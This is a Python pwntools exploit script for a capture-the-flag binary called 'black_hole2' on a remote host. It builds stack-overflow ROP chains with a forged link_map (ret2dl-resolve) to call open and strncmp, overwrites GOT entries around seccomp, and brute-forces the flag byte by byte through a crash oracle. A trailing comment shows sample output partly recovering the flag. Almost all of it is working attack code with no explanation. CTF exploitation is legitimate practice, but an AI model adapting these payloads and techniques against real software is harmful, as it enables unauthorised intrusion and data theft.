#!/usr/bin/env python
# coding: utf-8
from pwn import *
from hashlib import sha256
context.arch = "x86_64"
context.os = "linux"
context.word_size = 64
context.endian = "little"
context.log_level = "error"

def check_hash(chal1):
    while True:
        chal2 = ''.join(random.choice(string.letters+string.digits) for _ in xrange(4))
        chal = chal1 + chal2
        if sha256(chal).hexdigest().startswith('0000'):
            return chal2

local=False
name = "black_hole2"
binary = ELF(name)

def starter():
    if local:
        p = process(name)
    else:
        p = remote("192.168.201.23", 666)
        chal1 = p.readline().strip()
        sol = check_hash(chal1)
        assert len(sol) == 4
        p.send(sol)
    return p

def attach():
	if local:
		gdb.attach(pidof(name)[0],gdbscript = "source debug")

context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

off_onegadget = 0x4526A
offset___libc_start_main_ret = 0x20830
offset_system = 0x45390
offset_read = 0x00000000000f7220
offset_write = 0x00000000000f7280
offset_str_bin_sh = 0x18cd17
offset_open = 0x00000000000f7030
offset___libc_start_main = 0x0000000000020740
offset_strncmp = 0x0000000000145A90

def ret2dl_resolve_linkmap_x64(ELF_obj,known_offset_addr,two_offset,linkmap_addr):
    plt0 = ELF_obj.get_section_by_name('.plt').header.sh_addr
    linkmap=""
    linkmap+=p64(two_offset&(2**64-1))
    linkmap+=p64(0)+p64(linkmap_addr+0x18)
    linkmap+=p64((linkmap_addr+0x30-two_offset)&(2**64-1))+p64(0x7)+p64(0)
    linkmap+=p64(0) 
    linkmap+=p64(0)+p64(known_offset_addr-8)
    linkmap+='flag\x00\x00\x00\x00'
    linkmap = linkmap.ljust(0x68,'A')
    linkmap+=p64(linkmap_addr)
    linkmap+=p64(linkmap_addr+0x38)
    linkmap = linkmap.ljust(0xf8,'A')
    linkmap+=p64(linkmap_addr+8)
    resolve_call = p64(plt0+6)+p64(linkmap_addr)+p64(0)
    return (linkmap,resolve_call)


bss_addr = 0x601100
libc_start_main_got = 0x601050
target_offset =  offset_open - offset___libc_start_main
target2_offset = offset_strncmp - offset___libc_start_main
read_plt = 0x400730
alarm_got = 0x601040
read_got = 0x601048
seccomp_release_got = 0x601038
flag_addr = bss_addr + 0x200
guessing_addr = bss_addr + 0x300
ret_pointer = guessing_addr - 0x8


pop_rdi_ret = 0x0000000000400a33
pop_rsi_r15_ret = 0x0000000000400a31
ropchain_start = 0x0000000000400A2A
ropchain_mid = 0x0000000000400A10
oret = 0x00000000004006b9
pop_r15_ret = 0x0000000000400a32
pop_r15_ret_ptr = bss_addr + 0x100
read_rax_100 = 0x400993
read_0 = 0x40099B
overflow = 0x400987
cmp_gadget = 0x40096A
fake_stack = guessing_addr + 0x8


def try_once(guess_byte,idx):
	linkmap, resolve_call = ret2dl_resolve_linkmap_x64(binary, libc_start_main_got, target_offset, bss_addr)
	pld = "a" *0x28 + p64(ropchain_start) + p64(0) + p64(1) + p64(read_got) + p64(0x100) + p64(bss_addr) + p64(0) + p64(ropchain_mid) + p64(0xaaaadeadbeef)
	pld +=p64(0xaaaadeadbeef) * 6
	pld += p64(pop_rdi_ret) + p64(bss_addr + 0x48) + p64(pop_rsi_r15_ret) + p64(0) + p64(0)
	pld += resolve_call
	pld += p64(overflow)
	pld2 = "a" * 0x28 + p64(ropchain_start) + p64(0) + p64(1) + p64(read_got) + p64(0x100) + p64(flag_addr) + p64(3) + p64(ropchain_mid) + p64(0xaaaadeadbeef) * 7
	pld2 += p64(overflow)
	pld4 = "a" * 0x28 + p64(ropchain_start) + p64(0) + p64(1) + p64(read_got) + p64(0x8) + p64(seccomp_release_got) + p64(0) + p64(ropchain_mid) + p64(0xaaaadeadbeef) * 7
	pld4 += p64(overflow)
	pld5 = "a" * 0x28 + p64(ropchain_start) + p64(0) + p64(1) + p64(read_got) + p64(0x90) + p64(ret_pointer) + p64(0) + p64(ropchain_mid) + p64(0xaaaadeadbeef) * 7
	pld5 += p64(overflow)
	linkmap3, resolve_call3 = ret2dl_resolve_linkmap_x64(binary, libc_start_main_got, target2_offset, bss_addr)
	pld3_1 = "a" *0x28 + p64(ropchain_start) + p64(0) + p64(1) + p64(read_got) + p64(0x100) + p64(bss_addr) + p64(0) + p64(ropchain_mid) + p64(0xaaaadeadbeef) * 7
	pld3_1 += p64(overflow)
	pld3_2 = "a" *0x28 + p64(ropchain_start) + p64(0) + p64(1) + p64(ret_pointer) + p64(1) + p64(flag_addr + idx) + p64(guessing_addr) + p64(ropchain_mid) + p64(0xaaaadeadbeef)
	pld3_2 +=p64(0xaaaadeadbeef)  + p64(fake_stack - 0x8) + p64(0xaaaadeadbeef) *4
	pld3_2 += resolve_call3
	pld3_2 += p64(cmp_gadget)


	try:
		p = starter()
		#attach()
		guessing = guess_byte + '\x00' * 7
		payload_all = pld.ljust(0x100, 'a')
		payload_all += linkmap
		payload_all += pld2.ljust(0x100, 'a')
		payload_all += pld4.ljust(0x100, 'a')
		payload_all += p64(oret)
		payload_all += pld5.ljust(0x100, 'a')
		payload_all += p64(oret) + guessing + p64(ropchain_start) + p64(0) + p64(1) + p64(read_got) + p64(0x1000) + p64(bss_addr + 0x400) + p64(0) + p64(ropchain_mid) + p64(0xaaaadeadbeef) * 7 + p64(overflow)
		payload_all += pld3_1.ljust(0x100, 'a')
		payload_all += linkmap3
		
		
		payload_all += pld3_2.ljust(0x100, 'a')
		payload_all = payload_all.ljust(0x1000, 'b')
		p.send(payload_all)
		p.recv(timeout = 3)
		p.sendline("Let's try!")
	except Exception as e:
		p.close()
		return -1
	p.close()
	return 1


def try_3_time(guess_byte,idx):
	re1 = try_once(guess_byte,idx)
	re2 = try_once(guess_byte,idx)
	if re1 == re2:
		return re1
	else:
		re3 = try_once(guess_byte,idx)
		return re3

def brute_force(total_idx):

	guess_byte = 0x70
	small_idx = 0x10
	large_idx = 0x136
	last_idx = 0

	while True:
		v = try_3_time(chr(guess_byte), total_idx) 
		print "Guessing : ", hex(guess_byte), v, "between: ", hex(small_idx), " and ", hex(large_idx)
		if v == -1:
			small_idx = guess_byte
		else:
			large_idx = guess_byte
		last_idx = guess_byte
		guess_byte = (small_idx + large_idx) / 2
		if guess_byte == small_idx:
			return chr(guess_byte + 1)

		
flagg = ""
for i in range(0,0x20):
	flagg += brute_force(i)
	print flagg


'''
Guessing :  0x70 1 between:  0x20  and  0x126
Guessing :  0x48 -1 between:  0x20  and  0x70
Guessing :  0x5c -1 between:  0x48  and  0x70
Guessing :  0x66 1 between:  0x5c  and  0x70
Guessing :  0x61 -1 between:  0x5c  and  0x66
Guessing :  0x63 1 between:  0x61  and  0x66
Guessing :  0x62 -1 between:  0x61  and  0x63
flag{Blac
Guessing :  0x70 1 between:  0x20  and  0x126
Guessing :  0x48 -1 between:  0x20  and  0x70
Guessing :  0x5c -1 between:  0x48  and  0x70
Guessing :  0x66 -1 between:  0x5c  and  0x70
Guessing :  0x6b 1 between:  0x66  and  0x70
Guessing :  0x68 -1 between:  0x66  and  0x6b
Guessing :  0x69 -1 between:  0x68  and  0x6b
Guessing :  0x6a -1 between:  0x69  and  0x6b
flag{Black
'''